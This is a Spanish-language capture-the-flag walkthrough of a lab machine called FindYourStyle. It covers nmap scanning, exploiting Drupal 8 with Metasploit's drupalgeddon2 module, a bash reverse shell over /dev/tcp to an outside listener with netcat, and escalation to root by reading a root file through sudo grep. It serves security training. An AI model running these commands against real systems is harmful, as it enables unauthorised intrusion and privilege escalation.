---
description: >-
  ✍️ Autor: El Pingüino de Mario🔍 Dificultad: Fácil  📅 Fecha de creación:
  16/10/2024
---

# FindYourStyle

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 172.17.0.2
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (807).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 172.17.0.2
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (953).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 80** perteneciente al **servicio HTTP** está abierto por lo que a continuación se indagará más.

### 🔎 EXPLORACIÓN

Se utiliza el comando:

```bash
sudo nmap -sCV -p80 -v 172.17.0.2
```

para que nos proporcione más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (954).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora indagamos sobre el **servicio HTTP**. Se ingresó la **dirección IP** en el navegador lo que llevó a que la página web que está alojada a través de un **Drupal 8**.

<figure><img src="../../.gitbook/assets/image (956).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Esta versión contiene varios exploits pero voy a explotar uno concretamente con **Metasploit**.

```bash
msfconsole
search drupal 8
use exploit/unix/webapp/drupal_drupalgeddon2
show options
set RHOSTS 172.17.0.2
exploit
```

<figure><img src="../../.gitbook/assets/image (958).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (959).png" alt=""><figcaption></figcaption></figure>

En meterpreter.

<pre><code><strong>shell 
</strong>bash -i
find / -name settings.php 2>/dev/null
</code></pre>

<figure><img src="../../.gitbook/assets/image (960).png" alt=""><figcaption></figcaption></figure>

Nos mandamos una Reverse Shell.

```bash
/bin/bash -i >& /dev/tcp/192.168.255.136/443 0>&1
```

Nos ponemos en escucha.

```bash
nc -lvnp 443
```

<figure><img src="../../.gitbook/assets/image (961).png" alt=""><figcaption></figcaption></figure>

Hacemos el [tratamiento de la TTY](https://invertebr4do.github.io/tratamiento-de-tty/) para trabajar más cómodos.

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar. No tenemos permisos **SUDO**.

Nos logueamos con el usuario **ballenita** que hemos encontrado.

<figure><img src="../../.gitbook/assets/image (962).png" alt=""><figcaption></figcaption></figure>

Nos llama la atención **grep** por lo que buscamos en esta [página ](https://gtfobins.github.io/gtfobins/grep/#sudo)cómo explotarlo. Vamos a leer si hay en el directorio de `/root`.

```bash
sudo -u root /bin/ls /root/
sudo grep '' /root/secretitomaximo.txt
```

<figure><img src="../../.gitbook/assets/image (963).png" alt=""><figcaption></figcaption></figure>

Nos convertirnos en **root** con esas credenciales.

<figure><img src="../../.gitbook/assets/image (965).png" alt=""><figcaption></figcaption></figure>
